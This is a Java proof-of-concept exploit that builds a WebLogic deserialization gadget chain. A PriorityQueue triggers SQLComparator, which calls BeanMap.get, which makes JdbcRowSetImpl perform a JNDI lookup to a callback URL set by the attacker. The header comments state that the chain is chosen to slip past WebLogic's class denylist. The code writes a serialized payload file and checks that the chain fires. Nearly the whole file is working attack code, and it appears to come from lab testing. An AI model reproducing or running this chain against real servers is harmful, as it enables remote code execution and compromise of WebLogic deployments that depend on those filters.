import java.io.*;
import java.lang.reflect.*;
import java.util.*;

/**
 * WL7 Fix: SQLComparator + BeanMap + JdbcRowSetImpl
 *
 * SQLComparator.compare() casts args to Map and calls get(columnName).
 * BeanMap wraps a bean and implements Map -- get("prop") calls getProp().
 * JdbcRowSetImpl.getDatabaseMetaData() triggers JNDI connect().
 *
 * Chain:
 *   PriorityQueue.readObject() -> heapify()
 *     -> SQLComparator.compare(beanMap1, beanMap2)
 *       -> ((Map)beanMap1).get(colName)
 *         -> BeanMap.get("databaseMetaData")
 *           -> JdbcRowSetImpl.getDatabaseMetaData()
 *             -> connect() -> InitialContext.lookup(attacker_url)
 *
 * NO CC functors. NO blocked classes.
 * SQLComparator = weblogic.jdbc.rowset (NOT on denylist)
 * BeanMap = commons-beanutils (NOT on denylist, on WL classpath)
 */
public class WL7Fix {
    public static void main(String[] args) throws Exception {
        String callback = args.length > 0 ? args[0] : "rmi://host.docker.internal:1389/WL7_FIX";
        System.out.println("=== WL7 Fixed Chain Test ===");
        System.out.println("Callback: " + callback + "\n");

        // Step 1: Check BeanMap
        Class<?> beanMapClass = Class.forName("org.apache.commons.beanutils.BeanMap");
        System.out.println("BeanMap:");
        System.out.println("  Map: " + Map.class.isAssignableFrom(beanMapClass));
        System.out.println("  Serializable: " + Serializable.class.isAssignableFrom(beanMapClass));

        // Step 2: Check BeanMap.get() triggers getter
        Class<?> jrsClass = Class.forName("com.sun.rowset.JdbcRowSetImpl");
        Object jrs1 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs1, callback);

        Object beanMap1 = beanMapClass.getDeclaredConstructor(Object.class).newInstance(jrs1);
        System.out.println("  BeanMap created wrapping JdbcRowSetImpl");

        // List available properties in BeanMap
        System.out.println("  BeanMap keys (properties):");
        Map bm = (Map) beanMap1;
        int count = 0;
        for (Object key : bm.keySet()) {
            String k = key.toString();
            if (k.contains("atabase") || k.contains("ataSource") || k.contains("onnect")
                || k.contains("uto") || k.equals("class")) {
                System.out.println("    " + k);
            }
            count++;
        }
        System.out.println("  Total properties: " + count);

        // Step 3: Direct test -- BeanMap.get("databaseMetaData")
        System.out.println("\n  Calling beanMap.get('databaseMetaData')...");
        try {
            Object result = bm.get("databaseMetaData");
            System.out.println("  Returned: " + result);
        } catch (Throwable e) {
            System.out.println("  Exception: " + e.getClass().getName());
            // Check for JNDI evidence
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            String trace = sw.toString();
            boolean jndi = trace.contains("javax.naming") || trace.contains("connect")
                || trace.contains("JNDI") || trace.contains("lookup")
                || trace.contains("Connection refused");
            if (jndi) {
                System.out.println("  *** JNDI TRIGGERED via BeanMap.get()! ***");
                // Print relevant lines
                for (String line : trace.split("\n")) {
                    String l = line.toLowerCase();
                    if (l.contains("connect") || l.contains("jndi") || l.contains("naming")
                        || l.contains("lookup") || l.contains("beanmap")
                        || l.contains("datasource")) {
                        System.out.println("    " + line.trim());
                    }
                }
            }
        }

        // Step 4: Check SQLComparator -- what column name does it use?
        System.out.println("\n--- SQLComparator.compare() with BeanMap ---");
        Class<?> sqlCompClass = Class.forName("weblogic.jdbc.rowset.SQLComparator");

        // SQLComparator needs cols (column names)
        // The column name should be "databaseMetaData" to trigger the getter
        Object sqlComp = createWithoutConstructor(sqlCompClass);
        Field colsField = sqlCompClass.getDeclaredField("cols");
        colsField.setAccessible(true);

        ArrayList<String> cols = new ArrayList<String>();
        cols.add("databaseMetaData");  // This becomes the key for Map.get()!
        colsField.set(sqlComp, cols);

        // Create second BeanMap
        Object jrs2 = jrsClass.getDeclaredConstructor().newInstance();
        jrsClass.getMethod("setDataSourceName", String.class).invoke(jrs2, callback);
        Object beanMap2 = beanMapClass.getDeclaredConstructor(Object.class).newInstance(jrs2);

        Comparator comp = (Comparator) sqlComp;
        System.out.println("  SQLComparator.compare(BeanMap1, BeanMap2) with cols=['databaseMetaData']...");
        try {
            int result = comp.compare(beanMap1, beanMap2);
            System.out.println("  Returned: " + result);
        } catch (Throwable e) {
            System.out.println("  Exception: " + e.getClass().getName() + ": " +
                (e.getMessage() != null ? e.getMessage().substring(0, Math.min(200, e.getMessage().length())) : "null"));
            StringWriter sw = new StringWriter();
            e.printStackTrace(new PrintWriter(sw));
            String trace = sw.toString();
            boolean jndi = trace.contains("javax.naming") || trace.contains("connect")
                || trace.contains("JNDI") || trace.contains("lookup")
                || trace.contains("Connection refused");
            if (jndi) {
                System.out.println("  *** JNDI TRIGGERED via SQLComparator + BeanMap! ***");
            }
            // Print chain
            for (String line : trace.split("\n")) {
                String l = line.toLowerCase();
                if (l.contains("sqlcomparator") || l.contains("beanmap")
                    || l.contains("connect") || l.contains("jndi")
                    || l.contains("jdbcrowset") || l.contains("naming")
                    || l.contains("lookup") || l.contains("caused by")) {
                    System.out.println("    " + line.trim());
                }
            }
        }

        // Step 5: Full PriorityQueue roundtrip
        System.out.println("\n--- Full PriorityQueue Deserialization Test ---");
        if (!Serializable.class.isAssignableFrom(beanMapClass)) {
            System.out.println("  BeanMap is NOT Serializable -- trying alternative wrapper");
            // If BeanMap isn't Serializable, we can't use it in PQ directly
            // But we can use a different Map implementation
            return;
        }

        // Build PQ
        PriorityQueue pq = new PriorityQueue(2, comp);
        Field queueField = PriorityQueue.class.getDeclaredField("queue");
        queueField.setAccessible(true);
        Field sizeField = PriorityQueue.class.getDeclaredField("size");
        sizeField.setAccessible(true);
        queueField.set(pq, new Object[]{beanMap1, beanMap2});
        sizeField.set(pq, 2);

        System.out.println("  Serializing PQ...");
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        try {
            oos.writeObject(pq);
            oos.close();
            byte[] data = bos.toByteArray();
            System.out.println("  Serialized: " + data.length + " bytes");

            // Save to file
            try (FileOutputStream fos = new FileOutputStream("/tmp/wl7_fix_payload.bin")) {
                fos.write(data);
            }
            System.out.println("  Saved to /tmp/wl7_fix_payload.bin");

            // Deserialize
            System.out.println("  Deserializing...");
            try {
                ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
                Object result = ois.readObject();
                System.out.println("  Result: " + result.getClass().getName());
            } catch (Throwable e) {
                StringWriter sw = new StringWriter();
                e.printStackTrace(new PrintWriter(sw));
                String trace = sw.toString();
                boolean jndi = trace.contains("javax.naming") || trace.contains("connect")
                    || trace.contains("JNDI") || trace.contains("lookup")
                    || trace.contains("Connection refused");
                System.out.println("  Exception during deser: " + e.getClass().getSimpleName());
                if (jndi) {
                    System.out.println("\n  *** FULL CHAIN CONFIRMED ***");
                    System.out.println("  PQ.readObject -> SQLComparator.compare -> BeanMap.get -> JNDI!");
                }
                // Print chain
                for (String line : trace.split("\n")) {
                    String l = line.toLowerCase();
                    if (l.contains("sqlcomparator") || l.contains("beanmap")
                        || l.contains("connect") || l.contains("jndi")
                        || l.contains("jdbcrowset") || l.contains("naming")
                        || l.contains("priorityqueue") || l.contains("heapify")
                        || l.contains("caused by") || l.contains("lookup")) {
                        System.out.println("    " + line.trim());
                    }
                }
            }
        } catch (NotSerializableException e) {
            System.out.println("  NOT SERIALIZABLE: " + e.getMessage());
            System.out.println("  Need alternative Map that is Serializable");
        }
    }

    static Object createWithoutConstructor(Class<?> clazz) {
        try {
            Class<?> rfClass = Class.forName("sun.reflect.ReflectionFactory");
            Method getFactory = rfClass.getMethod("getReflectionFactory");
            Object rf = getFactory.invoke(null);
            Method newCSFA = rfClass.getMethod("newConstructorForSerialization",
                Class.class, Constructor.class);
            Constructor<?> objCtor = Object.class.getDeclaredConstructor();
            Constructor<?> ctor = (Constructor<?>) newCSFA.invoke(rf, clazz, objCtor);
            ctor.setAccessible(true);
            return ctor.newInstance();
        } catch (Exception e) {
            try {
                Constructor<?> c = clazz.getDeclaredConstructor();
                c.setAccessible(true);
                return c.newInstance();
            } catch (Exception e2) { return null; }
        }
    }
}
